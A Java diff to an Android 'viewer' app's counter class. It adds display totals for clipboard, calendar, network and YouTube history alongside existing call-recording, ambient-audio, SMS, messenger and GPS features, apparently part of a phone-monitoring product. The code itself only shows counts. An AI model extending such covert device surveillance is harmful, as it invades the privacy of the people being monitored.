@@ -24,24 +24,31 @@ import static com.scp.viewer.API.APIURL.getDateNowInMaxDate;
 import static com.scp.viewer.API.Global.AMBIENT_RECORDING_TOTAL;
 import static com.scp.viewer.API.Global.APP_INSTALLATION_TOTAL;
 import static com.scp.viewer.API.Global.APP_USAGE_TOTAL;
+import static com.scp.viewer.API.Global.CALENDAR_TOTAL;
 import static com.scp.viewer.API.Global.CALL_TOTAL;
+import static com.scp.viewer.API.Global.CLIPBOARD_TOTAL;
 import static com.scp.viewer.API.Global.CONTACT_TOTAL;
 import static com.scp.viewer.API.Global.FACEBOOK_TOTAL;
 import static com.scp.viewer.API.Global.GET_AMBIENT_VOICE_RECORDING;
 import static com.scp.viewer.API.Global.GET_APPLICATION_USAGE;
 import static com.scp.viewer.API.Global.GET_APP_INSTALLATION_HISTORY;
+import static com.scp.viewer.API.Global.GET_CALENDAR_HISTORY;
 import static com.scp.viewer.API.Global.GET_CALL_HISTORY;
+import static com.scp.viewer.API.Global.GET_CLIPBOARD_HISTORY;
 import static com.scp.viewer.API.Global.GET_CONTACT_HISTORY;
 import static com.scp.viewer.API.Global.GET_LOCATION_HISTORY;
+import static com.scp.viewer.API.Global.GET_NETWORK_HISTORY;
 import static com.scp.viewer.API.Global.GET_NOTES_HISTORY;
 import static com.scp.viewer.API.Global.GET_PHONE_CALL_RECORDING;
 import static com.scp.viewer.API.Global.GET_PHOTO_HISTORY;
 import static com.scp.viewer.API.Global.GET_SMS_HISTORY;
 import static com.scp.viewer.API.Global.GET_URL_HISTORY;
+import static com.scp.viewer.API.Global.GET_YOUTUBE_HISTORY;
 import static com.scp.viewer.API.Global.GPS_TOTAL;
 import static com.scp.viewer.API.Global.HANGOUTS_TOTAL;
 import static com.scp.viewer.API.Global.LENGHT;
 import static com.scp.viewer.API.Global.MIN_TIME;
+import static com.scp.viewer.API.Global.NETWORK_TOTAL;
 import static com.scp.viewer.API.Global.PHONE_CALL_RECORDING_TOTAL;
 import static com.scp.viewer.API.Global.PHOTO_TOTAL;
 import static com.scp.viewer.API.Global.SETTINGS;
@@ -56,6 +63,7 @@ import static com.scp.viewer.API.Global.SMS_WHATSAPP_TYPE;
 import static com.scp.viewer.API.Global.URL_TOTAL;
 import static com.scp.viewer.API.Global.VIBER_TOTAL;
 import static com.scp.viewer.API.Global.WHATSAPP_TOTAL;
+import static com.scp.viewer.API.Global.YOUTUBE_TOTAL;
 import static com.scp.viewer.View.SMSHistory.style;
 
 /**
@@ -251,10 +259,30 @@ public class APIGetTotalItemOfFeature {
 
                 setTotalNumberTextView(APP_INSTALLATION_TOTAL + deviceID, totalRow, false);
             }
+            else if(functionName.equals(GET_CLIPBOARD_HISTORY)) // 2021-07-14
+            {
+
+                setTotalNumberTextView(CLIPBOARD_TOTAL + deviceID, totalRow, false);
+            }
             else if(functionName.equals(GET_NOTES_HISTORY))
             {
 
                 txt_total_number.setVisibility(View.GONE);
+            }
+            else if(functionName.equals(GET_CALENDAR_HISTORY)) // 2021-07-15
+            {
+
+                setTotalNumberTextView(CALENDAR_TOTAL + deviceID, totalRow, false);
+            }
+            else if(functionName.equals(GET_NETWORK_HISTORY)) // 2021-07-15
+            {
+
+                setTotalNumberTextView(NETWORK_TOTAL + deviceID, totalRow, false);
+            }
+            else if(functionName.equals(GET_YOUTUBE_HISTORY)) // 2021-07-15
+            {
+
+                setTotalNumberTextView(YOUTUBE_TOTAL + deviceID, totalRow, false);
             }
         }
 
